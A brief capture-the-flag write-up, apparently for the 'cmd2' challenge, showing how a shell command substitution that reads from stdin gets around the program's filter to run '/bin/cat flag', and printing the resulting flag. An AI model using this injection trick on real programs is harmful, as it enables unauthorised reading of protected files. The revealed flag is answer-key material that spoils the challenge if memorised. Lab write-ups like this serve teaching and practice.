cmd2


After much consideration and failiure:
including echo -e \x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67
which didn't work
I found:
cmd2@pwnable:~$ ./cmd2 '$(read x; echo $x)'
$(read x; echo $x)
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha
